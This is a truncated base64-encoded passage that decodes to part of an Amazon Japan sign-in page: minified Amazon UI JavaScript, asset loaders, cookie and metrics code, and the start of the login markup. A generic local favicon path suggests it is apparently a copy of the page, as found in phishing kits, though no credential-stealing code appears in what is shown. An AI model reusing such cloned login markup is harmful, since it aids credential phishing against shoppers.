AgICAgICAgIG9hKGEsIGIsIGMsICJ1bnJlZ2lzdGVyIikKICAgICAgICAgICAgICAgIH0pLCB5KGYsICJsb2FkIiwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIEYud2hlbigiQSIsICJhLXV0aWwiKS5leGVjdXRlKGZ1bmN0aW9uIChhLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG9hKGEsIGMsIGIsICJyZWdpc3RlciIpOwogICAgICAgICAgICAgICAgICAgICAgICBtYSgpCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0pKSA6IChiICYmIChiLmJyb3dzZXIgJiYgcCh1KCJyZWdpc3RlciIsICJicm93c2VyIikgKyAidW5zdXBwb3J0ZWQiKSwgYi5wcm9kTXNob3AgJiYgcCh1KCJyZWdpc3RlciIsICJwcm9kX21zaG9wIikgKyAidW5zdXBwb3J0ZWQiKSwKICAgICAgICAgICAgICAgIGIuYmV0YU1zaG9wICYmIHAodSgicmVnaXN0ZXIiLCAiYmV0YV9tc2hvcCIpICsgInVuc3VwcG9ydGVkIikpLCBjICYmIChjLmJyb3dzZXIgJiYgcCh1KCJ1bnJlZ2lzdGVyIiwgImJyb3dzZXIiKSArICJ1bnN1cHBvcnRlZCIpLCBjLnByb2RNc2hvcCAmJiBwKHUoInVucmVnaXN0ZXIiLCAicHJvZF9tc2hvcCIpICsgInVuc3VwcG9ydGVkIiksIGMuYmV0YU1zaG9wICYmIHAodSgidW5yZWdpc3RlciIsICJiZXRhX21zaG9wIikgKyAidW5zdXBwb3J0ZWQiKSksIG1hKCkpCiAgICAgICAgICAgIH0pKHtyZWc6IHt9LCB1bnJlZzoge319KTsKICAgICAgICAgICAgdC5kZWNsYXJlKCJhLWZpeC1ldmVudC1vZmYiLCAhMSk7CiAgICAgICAgICAgIHgoInBhZ2Vqczpwa2dFeGVjVGltZSIsIEQoKSAtIFApCiAgICAgICAgfSkod2luZG93LCBkb2N1bWVudCwgRGF0ZSk7CiAgICAgICAgKHdpbmRvdy5BbWF6b25VSVBhZ2VKUyA/IEFtYXpvblVJUGFnZUpTIDogUCkubG9hZC5qcygnaHR0cHM6Ly9pbWFnZXMtbmEuc3NsLWltYWdlcy1hbWF6b24uY29tL2ltYWdlcy9JLzYxLTZuS1BLeVdMLl9SQ3wxMS1CWkVKOGxuTC5qcyw2MXEtVTlyQVozTC5qcywzMXg0RU5UbFZJTC5qcywzMWY0K1FJRWVxTC5qcywwMU42eHpJSnhiTC5qcyw1MThCSTQzM2FMTC5qcywwMXJwYXVUZXA0TC5qcywzMVFaU2pNdW9lTC5qcyw2MW9md3ZkZERlTC5qcywwMUtzTXhsUHR6TC5qc18uanM/QVVJQ2xpZW50cy9BbWF6b25VSScpOwogICAgICAgICh3aW5kb3cuQW1hem9uVUlQYWdlSlMgPyBBbWF6b25VSVBhZ2VKUyA6IFApLmxvYWQuanMoJ2h0dHBzOi8vaW1hZ2VzLW5hLnNzbC1pbWFnZXMtYW1hem9uLmNvbS9pbWFnZXMvSS8yMTZYek9SRTBHTC5fUkN8MjFaQTZYdzNIUEwuanMsMjFMM2ZuTEg0Z0wuanMsMzFqbVV5cEtGSUwuanMsMjFPNXpPR2w0V0wuanMsMDFsb2toK2ZPS0wuanMsNTFQKzI1SEVtVkwuanNfLmpzP0FVSUNsaWVudHMvQXV0aGVudGljYXRpb25Qb3J0YWxBc3NldHMnKTsKICAgICAgICAod2luZG93LkFtYXpvblVJUGFnZUpTID8gQW1hem9uVUlQYWdlSlMgOiBQKS5sb2FkLmpzKCdodHRwczovL2ltYWdlcy1uYS5zc2wtaW1hZ2VzLWFtYXpvbi5jb20vaW1hZ2VzL0kvMDE5NXAyeHowTUwuanM/QVVJQ2xpZW50cy9BdXRoZW50aWNhdGlvblBvcnRhbElubGluZUFzc2V0cycpOwogICAgICAgICh3aW5kb3cuQW1hem9uVUlQYWdlSlMgPyBBbWF6b25VSVBhZ2VKUyA6IFApLmxvYWQuanMoJ2h0dHBzOi8vaW1hZ2VzLW5hLnNzbC1pbWFnZXMtYW1hem9uLmNvbS9pbWFnZXMvSS8zMXZ6Qy0xTDFwTC5qcz9BVUlDbGllbnRzL0NWRkFzc2V0cycpOwogICAgICAgICh3aW5kb3cuQW1hem9uVUlQYWdlSlMgPyBBbWF6b25VSVBhZ2VKUyA6IFApLmxvYWQuanMoJ2h0dHBzOi8vaW1hZ2VzLW5hLnNzbC1pbWFnZXMtYW1hem9uLmNvbS9pbWFnZXMvSS83MTh5RnlBVEUwTC5qcz9BVUlDbGllbnRzL0ZXQ0lNQXNzZXRzJyk7CiAgICA8L3NjcmlwdD4KCgogICAgPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPgogICAgICAgIHdpbmRvdy51ZV9paGUgPSAod2luZG93LnVlX2loZSB8fCAwKSArIDE7CiAgICAgICAgaWYgKHdpbmRvdy51ZV9paGUgPT09IDEpIHsKICAgICAgICAgICAgKGZ1bmN0aW9uIChrLCBsLCBnKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBtKGEpIHsKICAgICAgICAgICAgICAgICAgICBjIHx8IChjID0gYlthLnR5cGVdLmlkLCAidW5kZWZpbmVkIiA9PT0gdHlwZW9mIGEuY2xpZW50WCA/IChlID0gYS5wYWdlWCwgZiA9IGEucGFnZVkpIDogKGUgPSBhLmNsaWVudFgsIGYgPSBhLmNsaWVudFkpLCAyICE9IGMgfHwgaCAmJiAoaCAhPSBlIHx8IG4gIT0gZikgPyAocigpLCBkLmlzbCAmJiBsLnNldFRpbWVvdXQoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBwKCJhdCIsIGQuaWQpCiAgICAgICAgICAgICAgICAgICAgfSwgMCkpIDogKGggPSBlLCBuID0gZiwgYyA9IDApKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHIoKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgYSBpbiBiKSBiLmhhc093blByb3BlcnR5KGEpICYmIGQuZGV0YWNoKGEsIG0sIGJbYV0ucGFyZW50KQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHMoKSB7CiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgYSBpbiBiKSBiLmhhc093blByb3BlcnR5KGEpICYmIGQuYXR0YWNoKGEsIG0sIGJbYV0ucGFyZW50KQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHQoKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGEgPSAiIjsKICAgICAgICAgICAgICAgICAgICAhcSAmJiBjICYmIChxID0gMSwgYSArPSAiJnVpPSIgKyBjKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIHZhciBkID0gay51ZSwgcCA9IGsudWV4LCBxID0gMCwgYyA9IDAsIGgsIG4sIGUsIGYsIGIgPSB7CiAgICAgICAgICAgICAgICAgICAgY2xpY2s6IHtpZDogMSwgcGFyZW50OiBnfSwgbW91c2Vtb3ZlOiB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlkOiAyLAogICAgICAgICAgICAgICAgICAgICAgICBwYXJlbnQ6IGcKICAgICAgICAgICAgICAgICAgICB9LCBzY3JvbGw6IHtpZDogMywgcGFyZW50OiBsfSwga2V5ZG93bjoge2lkOiA0LCBwYXJlbnQ6IGd9CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgZCAmJiBwICYmIChzKCksIGQuX3VpID0gdCkKICAgICAgICAgICAgfSkodWVfY3NtLCB3aW5kb3csIGRvY3VtZW50KTsKCgogICAgICAgICAgICAoZnVuY3Rpb24gKHMsIGwpIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG0oYiwgZSwgYykgewogICAgICAgICAgICAgICAgICAgIGMgPSBjIHx8IG5ldyBEYXRlKCtuZXcgRGF0ZSArIHQpOwogICAgICAgICAgICAgICAgICAgIGMgPSAiZXhwaXJlcz0iICsgYy50b1VUQ1N0cmluZygpOwogICAgICAgICAgICAgICAgICAgIG4uY29va2llID0gYiArICI9IiArIGUgKyAiOyIgKyBjICsgIjtwYXRoPS8iCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcChiKSB7CiAgICAgICAgICAgICAgICAgICAgYiArPSAiPSI7CiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgZSA9IG4uY29va2llLnNwbGl0KCI7IiksIGMgPSAwOyBjIDwgZS5sZW5ndGg7IGMrKykgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBhID0gZVtjXTsgIiAiID09IGEuY2hhckF0KDApOykgYSA9IGEuc3Vic3RyaW5nKDEpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoMCA9PT0gYS5pbmRleE9mKGIpKSByZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KGEuc3Vic3RyaW5nKGIubGVuZ3RoLCBhLmxlbmd0aCkpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiAiIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHEoYiwgZSwgYykgewogICAgICAgICAgICAgICAgICAgIGlmICghZSkgcmV0dXJuIGI7CiAgICAgICAgICAgICAgICAgICAgLTEgPCBiLmluZGV4T2YoInsiKSAmJiAoYiA9ICIiKTsKICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBhID0gYi5zcGxpdCgiJiIpLCBmLCBkID0gITEsIGggPSAhMSwgZyA9IDA7IGcgPCBhLmxlbmd0aDsgZysrKSBmID0gYVtnXS5zcGxpdCgiOiIpLCBmWzBdID09IGUgPyAoIWMgfHwgZCA/IGEuc3BsaWNlKGcsIDEpIDogKGZbMV0gPSBjLCBhW2ddID0KICAgICAgICAgICAgICAgICAgICAgICAgZi5qb2luKCI6IikpLCBoID0gZCA9ICEwKSA6IDIgPiBmLmxlbmd0aCAmJiAoYS5zcGxpY2UoZywgMSksIGggPSAhMCk7CiAgICAgICAgICAgICAgICAgICAgaCAmJiAoYiA9IGEuam9pbigiJiIpKTsKICAgICAgICAgICAgICAgICAgICAhZCAmJiBjICYmICgwIDwgYi5sZW5ndGggJiYgKGIgKz0gIiYiKSwgYiArPSBlICsgIjoiICsgYyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgayA9IHMudWUgfHwge30sIHQgPSA2MDQ4RTcsIG4gPSB1ZV9jc20uZG9jdW1lbnQgfHwgbC5kb2N1bWVudCwgciA9IG51bGwsIGQ7CiAgICAgICAgICAgICAgICBhOnsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBkID0gbC5sb2NhbFN0b3JhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIGEKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoICh1KSB7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGQgPSB2b2lkIDAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGsuY291bnQgJiYgay5jb3VudCgiY3NtLmNvb2tpZVNpemUiLCBkb2N1bWVudC5jb29raWUubGVuZ3RoKTsKICAgICAgICAgICAgICAgIGsuY29va2llID0gewogICAgICAgICAgICAgICAgICAgIGdldDogcCwgc2V0OiBtLCB1cGRhdGVDc21IaXQ6IGZ1bmN0aW9uIChiLCBlLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghKGEgPSByKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBmOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGE6ewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQgJiYgZC5nZXRJdGVtKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZiA9IGQuZ2V0SXRlbSgiY3NtLWhpdCIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoaykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYgPSB2b2lkIDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGYgfHwgcCgiY3NtLWhpdCIpIHx8ICJ7fSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSBxKGEsIGIsIGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IGEgPSBxKGEsICJ0IiwgK25ldyBEYXRlKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCAmJiBkLnNldEl0ZW0gJiYgZC5zZXRJdGVtKCJjc20taGl0IiwgYSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG0oImNzbS1oaXQiLCBhLCBjKQogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZnVuY3Rpb24iID09IHR5cGVvZiBsLnVlTG9nRXJyb3IgJiYgdWVMb2dFcnJvcihFcnJvcigiQ29va2llIG1hbmFnZXI6ICIgKyBnLm1lc3NhZ2UpLCB7bG9nTGV2ZWw6ICJXQVJOIn0pCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pKHVlX2NzbSwgd2luZG93KTsKCiAgICAgICAgICAgIChmdW5jdGlvbiAobCwgZCkgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gYyhiKSB7CiAgICAgICAgICAgICAgICAgICAgYiA9ICIiOwogICAgICAgICAgICAgICAgICAgIHZhciBjID0gYS5pc0JGVCA/ICJiIiA6ICJzIiwgZCA9ICIiICsgYS5vaWQsIGYgPSAiIiArIGEubGlkLCBnID0gZDsKICAgICAgICAgICAgICAgICAgICBkICE9IGYgJiYgMjAgPT0gZi5sZW5ndGggJiYgKGMgKz0gImEiLCBnICs9ICItIiArIGYpOwogICAgICAgICAgICAgICAgICAgIGEudGFiaWQgJiYgKGIgPSBhLnRhYmlkICsgIisiKTsKICAgICAgICAgICAgICAgICAgICBiICs9IGMgKyAiLSIgKyBnOwogICAgICAgICAgICAgICAgICAgIGIgIT0gZSAmJiAxMDAgPiBiLmxlbmd0aCAmJiAoZSA9IGIsIGEuY29va2llID8gYS5jb29raWUudXBkYXRlQ3NtSGl0KG0sIGIgKyAoInwiICsgK25ldyBEYXRlKSkgOiBkb2N1bWVudC5jb29raWUgPSAiY3NtLWhpdD0iICsgYiArICgifCIgKyArbmV3IERhdGUpICsgbiArICI7IHBhdGg9LyIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcCgpIHsKICAgICAgICAgICAgICAgICAgICBlID0gMAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGgoYikgewogICAgICAgICAgICAgICAgICAgICEwID09PSBkW2EucGFnZVZpei5wcm9wSGlkXSA/IGUgPSAwIDogITEgPT09IGRbYS5wYWdlVml6LnByb3BIaWRdICYmIGMoe3R5cGU6ICJ2aXNpYmxlIn0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgdmFyIG4gPSAiOyBleHBpcmVzPSIgKyAobmV3IERhdGUoK25ldyBEYXRlICsgNjA0OEU1KSkudG9HTVRTdHJpbmcoKSwgbSA9ICJ0YiIsIGUsIGEgPSBsLnVlIHx8IHt9LAogICAgICAgICAgICAgICAgICAgIGsgPSBhLnBhZ2VWaXogJiYgYS5wYWdlVml6LmV2ZW50ICYmCiAgICAgICAgICAgICAgICAgICAgICAgIGEucGFnZVZpei5wcm9wSGlkOwogICAgICAgICAgICAgICAgYS5hdHRhY2ggJiYgKGEuYXR0YWNoKCJjbGljayIsIGMpLCBhLmF0dGFjaCgia2V5dXAiLCBjKSwgayB8fCAoYS5hdHRhY2goImZvY3VzIiwgYyksIGEuYXR0YWNoKCJibHVyIiwgcCkpLCBrICYmIChhLmF0dGFjaChhLnBhZ2VWaXouZXZlbnQsIGgsIGQpLCBoKHt9KSkpOwogICAgICAgICAgICAgICAgYS5hZnRiID0gMQogICAgICAgICAgICB9KSh1ZV9jc20sIGRvY3VtZW50KTsKCgogICAgICAgICAgICB1ZV9jc20udWUuc3R1Yih1ZSwgImltcHJlc3Npb24iKTsKCgogICAgICAgICAgICB1ZS5zdHViKHVlLCAidHJpZ2dlciIpOwoKCiAgICAgICAgICAgIGlmICh3aW5kb3cudWUgJiYgdWV0KSB7CiAgICAgICAgICAgICAgICB1ZXQoJ2JiJyk7CiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgPC9zY3JpcHQ+CiAgICA8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Ii9zdGF0aWMvYXNzZXRzL2ltZy9mYXZpY29uLmljbyIvPgo8L2hlYWQ+Cgo8Ym9keSBjbGFzcz0iYXAtbG9jYWxlLWphX0pQIGEtbS1jbiBhLWF1aV8xNTcxNDEtYyBhLWF1aV8xNTg2MTMtdDEgYS1hdWlfNzI1NTQtYyBhLWF1aV9kcm9wZG93bl8xODc5NTktYyBhLWF1aV9wY2lfcmlza19iYW5uZXJfMjEwMDg0LWMgYS1hdWlfcGVyZl8xMzAwOTMtYyBhLWF1aV90bnJfdjJfMTgwODM2LWMgYS1hdWlfdXhfMTQ1OTM3LWMiPgoKPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPgoKICAgIChmdW5jdGlvbiAoKSB7CiAgICAgICAgZnVuY3Rpb24gbChhKSB7CiAgICAgICAgICAgIGZvciAodmFyIGMgPSBiLmxvY2F0aW9uLnNlYXJjaC5zdWJzdHJpbmcoMSkuc3BsaXQoIiYiKSwgZSA9IDA7IGUgPCBjLmxlbmd0aDsgZSsrKSB7CiAgICAgICAgICAgICAgICB2YXIgZCA9IGNbZV0uc3BsaXQoIj0iKTsKICAgICAgICAgICAgICAgIGlmIChkWzBdID09PSBhKSByZXR1cm4gZFsxXQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICB3aW5kb3cuYW16biA9IHdpbmRvdy5hbXpuIHx8IHt9OwogICAgICAgIGFtem4uY29waWxvdCA9IGFtem4uY29waWxvdCB8fCB7fTsKICAgICAgICB2YXIgYiA9IHdpbmRvdywgZiA9IGRvY3VtZW50LCBnID0gYi5QIHx8IGIuQW1hem9uVUlQYWdlSlMsIGggPSBmLmhlYWQgfHwgZi5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLAogICAgICAgICAgICBtID0gMCwgbiA9IDA7CiAgICAgICAgYW16bi5jb3BpbG90LmNoZWNrQ29QaWxvdFNlc3Npb24gPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIGYuY29va2llLm1hdGNoKCJjcGlkdiIpICYmICgidW5kZWZpbmVkIiAhPT0gdHlwZW9mIGpRdWVyeSAmJiBrKGpRdWVyeSksIGcgJiYgZy53aGVuICYmIGcud2hlbigialF1ZXJ5IikuZXhlY3V0ZShmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgayhhKQogICAgICAgICAgICB9KSwgYi5hbXpuSlEgJiYgYi5hbXpuSlEuYXZhaWxhYmxlICYmIGIuYW16bkpRLmF2YWlsYWJsZSgialF1ZXJ5IiwKICAgICAgICAgICAgICAgIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICBrKGpRdWVyeSkKICAgICAgICAgICAgICAgIH0pLCBiLmpRdWVyeSB8fCBnIHx8IGIuYW16bkpRIHx8IHEoKSkKICAgICAgICB9OwogICAgICAgIHZhciBxID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICBtID8gYi51ZSAmJiAiZnVuY3Rpb24iID09PSB0eXBlb2YgYi51ZS5jb3VudCAmJiBiLnVlLmNvdW50KCJjcEpRVW5hdmFpbGFibGUiLCAxKSA6IChtID0gMSwgZi5hZGRFdmVudExpc3RlbmVyID8gZi5hZGRFdmVudExpc3RlbmVyKCJET01Db250ZW50TG9hZGVkIiwgYW16bi5jb3BpbG90LmNoZWNrQ29QaWxvdFNlc3Npb24sICExKSA6IGYuYXR0YWNoRXZlbnQgJiYgZi5hdHRhY2hFdmVudCgib25yZWFkeXN0YXRlY2hhbmdlIiwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgImNvbXBsZXRlIiA9PT0gZi5yZWFkeVN0YXRlICYmIGFtem4uY29waWxvdC5jaGVja0NvUGlsb3RTZXNzaW9uKCkKICAgICAgICAgICAgfSkpCiAgICAgICAgfSwgayA9IGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgIGlmICghbikgewogICAgICAgICAgICAgICAgbiA9IDE7CiAgICAgICAgICAgICAgICBhbXpuLmNvcGlsb3QualF1ZXJ5ID0gYTsKICAgICAgICAgICAgICAgIGEgPSBsKCJkZWJ1Z0pTIik7CiAgICAgICAgICAgICAgICB2YXIgYyA9ICJodHRwczoiID09PSBiLmxvY2F0aW9uLnByb3RvY29sID8gMSA6IDAsIGUgPSAxOwogICAgICAgICAgICAgICAgdXJsID0gIi9ncC9jb3BpbG90L2hhbmRsZXJzL2NvcGlsb3Rfc3RyaW5nc19yZXNvdXJjZXMuaHRtbCI7CiAgICAgICAgICAgICAgICB3aW5kb3cudGV4YXMgJiYgdGV4YXMubG9jYXRpb25zICYmICh1cmwgPSB0ZXhhcy5sb2NhdGlvbnMubWFrZVVybCh1cmwpKTsKICAgICAgICAgICAgICAgIGcgJiYgZy5BVUlfQlVJTERfREFURSAmJiAoZSA9IDApOwogICAgICAgICAgICAgICAgYW16bi5jb3BpbG90LmpRdWVyeS5hamF4ICYmIGFtem4uY29waWxvdC5qUXVlcnkuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgdXJsOiB1cmwsCiAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGU6ICJqc29uIiwKICAgICAgICAgICAgICAgICAgICBkYXRhOiB7aXNEZWJ1ZzogYSwgaXNTZWN1cmU6IGMsIGluY2x1ZGVBVUlQOiBlfSwKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICBhbXpuLmNvcGlsb3QudmlwID0gYS5zZXJ2aWNlRW5kUG9pbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGFtem4uY29waWxvdC5lbmFibGVNdWx0aXBsZVRhYlNlc3Npb24gPSBhLmlzRm9sbG93TWU7CiAgICAgICAgICAgICAgICAgICAgICAgIHIoYSkKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIGVycm9yOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGIudWUuY291bnQoImNwTG9hZFJlc291cmNlRXJyb3IiLCAxKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIH0KICAgICAgICB9LCByID0gZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgdmFyIGMgPSBhbXpuLmNvcGlsb3QualF1ZXJ5LCBlID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgYW16bi5jb3BpbG90LnNldHVwKGMuZXh0ZW5kKHtpc0NvbnRpbnVlZFNlc3Npb246ICEwfSwgYSkpCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIGEuQ1NTVXJscyAmJgogICAgICAgICAgICBjLmVhY2goYS5DU1NVcmxzWzBdLCBmdW5jdGlvbiAoYSwgYykgewogICAgICAgICAgICAgICAgdmFyIGIgPSBmLmNyZWF0ZUVsZW1lbnQoImxpbmsiKTsKICAgICAgICAgICAgICAgIGIudHlwZSA9ICJ0ZXh0L2NzcyI7CiAgICAgICAgICAgICAgICBiLnJlbCA9ICJzdHlsZXNoZWV0IjsKICAgICAgICAgICAgICAgIGIuaHJlZiA9IGM7CiAgICAgICAgICAgICAgICBoLmFwcGVuZENoaWxkKGIpCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBhLkNTU1RhZyAmJiBzKGEuQ1NTVGFnKTsKICAgICAgICAgICAgaWYgKGEuSlNVcmxzKSB7CiAgICAgICAgICAgICAgICB2YXIgZCA9IGwoImZvcmNlU3luY2hyb25vdXNKUyIpLCBiID0gYS5KU1VybHNbMF07CiAgICAgICAgICAgICAgICBjLmVhY2goYiwgZnVuY3Rpb24gKGEsIGMpIHsKICAgICAgICAgICAgICAgICAgICBhID09PSBiLmxlbmd0aCAtIDEgPyBwKGMsIGQsIGUpIDogcChjLCBkKQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgfQogICAgICAgICAgICBhLkpTVGFnICYmICh0KGEuSlNUYWcpLCBQLndoZW4oIkNTQ29QaWxvdFByZXNlbnRlckFzc2V0IikuZXhlY3V0ZShmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBlKCkKICAgICAgICAgICAgfSkpCiAgICAgICAgfSwgdCA9IGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgIHZhciBjID0gZi5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgYy5pbm5lckhUTUwgPSBhOwogICAgICAgICAgICBhID0gMDsKICAgICAgICAgICAgZm9yICh2YXIgYiA9IGMuY2hpbGRyZW4ubGVuZ3RoOyBhIDwgYjsgYSsrKSB7CiAgICAgICAgICAgICAgICB2YXIgZCA9IGYuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgICAgICAgICBkLnR5cGUgPSAidGV4dC9qYXZhc2NyaXB0IjsKICAgICAgICAgICAgICAgIGQuaW5uZXJIVE1MID0gYy5jaGlsZHJlblthXS5pbm5lckhUTUw7CiAgICAgICAgICAgICAgICBoLmFwcGVuZENoaWxkKGQpCiAgICAgICAgICAgIH0KICAgICAgICB9LCBzID0gZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgdmFyIGIgPSBmLmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgICAgICBiLmlubmVySFRNTCA9IGE7CiAgICAgICAgICAgIGEgPSAwOwogICAgICAgICAgICBmb3IgKHZhciBlID0gYi5jaGlsZHJlbi5sZW5ndGg7IGEgPCBlOyBhKyspIGguYXBwZW5kQ2hpbGQoYi5jaGlsZHJlblthXSkKICAgICAgICB9LCBwID0gZnVuY3Rpb24gKGEsIGIsIGUpIHsKICAgICAgICAgICAgdmFyIGQgPSBmLmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgICAgICBkLnR5cGUgPSAidGV4dC9qYXZhc2NyaXB0IjsKICAgICAgICAgICAgZC5zcmMgPSBhOwogICAgICAgICAgICBkLmFzeW5jID0gYiA/ICExIDogITA7CiAgICAgICAgICAgIGUgJiYgKGQub25sb2FkID0gZSk7CiAgICAgICAgICAgIGguYXBwZW5kQ2hpbGQoZCkKICAgICAgICB9CiAgICB9KSgpOwoKICAgIGFtem4uY29waWxvdC5jaGVja0NvUGlsb3RTZXNzaW9uKCk7Cgo8L3NjcmlwdD4KPGRpdiBpZD0iYS1wYWdlIj4KICAgIDxkaXYgY2xhc3M9ImEtc2VjdGlvbiBhLXBhZGRpbmctbWVkaXVtIGF1dGgtd29ya2Zsb3ciPgogICAgICAgIDxkaXYgY2xhc3M9ImEtc2VjdGlvbiBhLXNwYWNpbmctbm9uZSBhdXRoLW5hdmJhciI+CgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYS1zZWN0aW9uIGEtc3BhY2luZy1tZWRpdW0gYS10ZXh0LWNlbnRlciI+CgoKICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJhLWxpbmstbmF2LWljb24iIHRhYmluZGV4PSItMSIgaHJlZj0iaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL3JlZj1hcF9mcm5fbG9nbyI+CgogICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJhLWljb24gYS1pY29uLWxvZ28iIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iQW1hem9uIj48L2k+CgoKICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iYS1pY29uIGEtaWNvbi1qcCBhLWljb24tZG9tYWluLWpwIGEtaWNvbi1kb21haW4iIHJvbGU9ImltZyI+PC9pPgoKCiAgICAgICAgICAgICAgICA8L2E+CgoKICAgICAgICAgICAgPC9kaXY+CgoKICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBpZD0